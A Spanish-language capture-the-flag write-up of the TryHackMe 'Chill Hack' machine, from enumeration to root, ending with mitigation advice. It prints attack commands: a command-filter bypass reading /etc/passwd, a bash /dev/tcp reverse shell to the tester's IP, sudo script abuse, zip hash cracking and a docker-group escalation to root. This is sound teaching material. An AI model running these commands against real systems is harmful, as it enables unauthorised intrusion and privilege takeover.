---
description: 'Dificultad: fácil'
---

# 💻 Chill Hack

## Enumeración

Comenzamos haciendo un escaneo de puertos con **Nmap:**

```bash
map -p- --open --min-rate 5000 -sSVC -Pn -v -oN escaneo.txt 10.10.14.130
```

<figure><img src="../../.gitbook/assets/imagen (41).png" alt="Escaneo Nmap"><figcaption></figcaption></figure>

Como se ve en la imagen la máquina tiene 3 puertos abiertos: **21(FTP)**, **22(SSH)**, **80(HTTP).**

Por el escaneo hecho con nmap vemos el servicio **FTP** tiene habilitado el login "anonymous" y que hay por lo menos un archivo **.txt,** así que entramos y descargamos el archivo **note.txt** a nuestro pc. Vemos que hay dos posibles usuarios: **anurodh** y **apaar.**\


<figure><img src="../../.gitbook/assets/imagen (43).png" alt=""><figcaption></figcaption></figure>

Después nos pasamos al servicio **HTTP,** entramos a la página web e inspeccionamos pero no encontramos nada que nos ayude.

<figure><img src="../../.gitbook/assets/imagen (44).png" alt="Página web"><figcaption></figcaption></figure>

### Fuzzing web

Procedemos a hacer enumeración de directorios con **Gobuster:**

```bash
gobuster dir -u http://10.10.14.130 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

Esto nos da una ruta de interés `/secret`

<figure><img src="../../.gitbook/assets/imagen (65).png" alt="Enumeracion gobuster"><figcaption></figcaption></figure>

Al ir a la ruta, encontramos con un campo en el que podemos introducir comandos, pero aquí es donde aplican las restricciones que se mencionaban en la nota, ya que al querer usar comandos como `ls` o `cat /etc/passwd` aparece un mensaje en rojo.

<div align="left">

<figure><img src="../../.gitbook/assets/imagen (45).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src="../../.gitbook/assets/imagen (66).png" alt=""><figcaption></figcaption></figure>

</div>

Intentamos pasar este filtro usando el comando `echo` y confirmamos usuarios mencionados en la nota y algún otro.

```bash
echo $(cat /etc/passwd)
```

<figure><img src="../../.gitbook/assets/imagen (48).png" alt=""><figcaption></figcaption></figure>

## Explotación

Una vez  visto como saltarnos las restricciones, podemos enviarnos una **reverse shell**

```bash
echo $(bash -c  "bash -i >& /dev/tcp/10.9.0.2/443 0>&1")
```

<figure><img src="../../.gitbook/assets/imagen (50).png" alt="reverse shell"><figcaption></figcaption></figure>

Hacemos enumeración de las carpetas de los usuarios entramos a la unica carpeta a la que tenemos acceso `/apaar` entre los archivos encontramos un script en bash llamado `.helpline.sh`, en el contenido del script podemos ver que podríamos ejecutar comandos.

<figure><img src="../../.gitbook/assets/imagen (52).png" alt=""><figcaption></figcaption></figure>

Listamos que podemos ejecutar como sudo y por suerte podemos ejecutar el script como el usuario **apaar.**

```bash
sudo -l
```

<figure><img src="../../.gitbook/assets/imagen (53).png" alt=""><figcaption></figcaption></figure>

## Movimiento Lateral

Ejecutamos el script como el usuario **apaar** y cuando nos pregunte por el mensaje ingresamos `/bin/bash`, con esto logramos migrar de usuario.

```bash
sudo -u apaar /home/apaar/.helpline.sh
```

<figure><img src="../../.gitbook/assets/imagen (54).png" alt=""><figcaption></figcaption></figure>

Una vez dentro del usuario podemos ver la **primer flag** dentro del archivo `local.txt`

<figure><img src="../../.gitbook/assets/imagen (55).png" alt=""><figcaption></figcaption></figure>

Después de estar explorando mucho alguna forma de escalar privilegios o movernos a otro usuario, admito que tuve que buscar alguna pista, la cual encontré en este writeup:

{% embed url="https://hack.xero-sec.com/writeups/tryhackme/chill-hack" %}

Con esta pista, me di cuenta que debía de buscar en `/var/www/files` donde encontramos un archivo **.php,** al parecer debe de haber algo interesante con la imagen `hacker-with-laptop_23-2147985341.jpg`

<figure><img src="../../.gitbook/assets/imagen (56).png" alt=""><figcaption></figcaption></figure>

En la ruta de la imagen creamos un server en Python y en la descargamos en nuestra máquina local con **wget**.&#x20;

<figure><img src="../../.gitbook/assets/imagen (68).png" alt="Python server"><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (67).png" alt=""><figcaption></figcaption></figure>

Una vez descargada la imagen, intentamos ver sus metadatos con **exiftool**, pero hallamos algo de interés. Por lo que usamos **steghide** extraer cual quier información oculta que pueda tener la imagen.

```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

<figure><img src="../../.gitbook/assets/imagen (59).png" alt=""><figcaption></figcaption></figure>

Nos extrajo un archivo **.zip** el cual esta protegido con contraseña , por lo que usamos **JohnTheRipper**, primero extraemos la el **hash** de la contraseña con **zip2john** y después intentamos romper el hash con **John.**

```bash
zip2john backup.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/imagen (58).png" alt=""><figcaption></figcaption></figure>

Con la contraseña obtenida extraemos el contenido del zip, el cual es un archvio php, en su contenido podemos ver que esta contraseña en base64 del usuario **anurodh.**

<figure><img src="../../.gitbook/assets/imagen (60).png" alt=""><figcaption></figcaption></figure>

Decodificamos la contraseña y en la máquina victima nos cambiamos al usuario **anurodh**

<div>

<figure><img src="../../.gitbook/assets/imagen (61).png" alt="Bas64 decoded password"><figcaption><p>base64 decode</p></figcaption></figure>

 

<figure><img src="../../.gitbook/assets/imagen (62).png" alt="su anurodh"><figcaption><p>su anurodh</p></figcaption></figure>

</div>

## Escalada de privilegios

Con el comando `id`, vemos el el usuario anurodh pertenece al grupo **docker**

<figure><img src="../../.gitbook/assets/imagen (69).png" alt="id anurodh"><figcaption><p>id anurodh</p></figcaption></figure>

Haciendo una búsqueda rápida en [GTFOBins](https://gtfobins.github.io/gtfobins/docker/), encontramos el siguiente comando para escalar privilegios.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

<figure><img src="../../.gitbook/assets/imagen (64).png" alt=""><figcaption></figcaption></figure>

Como **root** podemos ver el contenido de la **segunda flag**.

<figure><img src="../../.gitbook/assets/imagen (63).png" alt="root flag"><figcaption><p>root flag</p></figcaption></figure>

## Recomendaciones de mitigación

1. **Eliminar login anonimo del servicio FTP.**
2. **Configurar reglas de firewall para evitar escaneos automatizados.**
3. **Restringir la ejecución de comandos en el panel web**: Implementar controles estrictos sobre qué comandos pueden ejecutarse desde la interfaz web, limitando el acceso a solo aquellos necesarios para la funcionalidad del sistema. Además, utilizar mecanismos de escape para evitar la inyección de comandos maliciosos, y aplicar roles y permisos adecuados para el uso de esta funcionalidad.
4. **Validar entradas en scripts sensibles**: Modificar el script **helpline.sh** para evitar la ejecución de comandos arbitrarios al usar variables como `$msg`. En su lugar, las entradas de los usuarios deben ser validadas o sanitizadas para evitar inyecciones de comandos. Además, limitar la ejecución del script a usuarios autorizados y revisar las configuraciones de `sudo` para evitar escaladas de privilegios.
5. **Evitar exponer contraseñas**, incluso si están cifradas, y usuarios en scripts, como es el caso de `source_code.php`
6. **Implementar contraseñas más fuertes y seguras**, así como algoritmos de hasheo más robustos
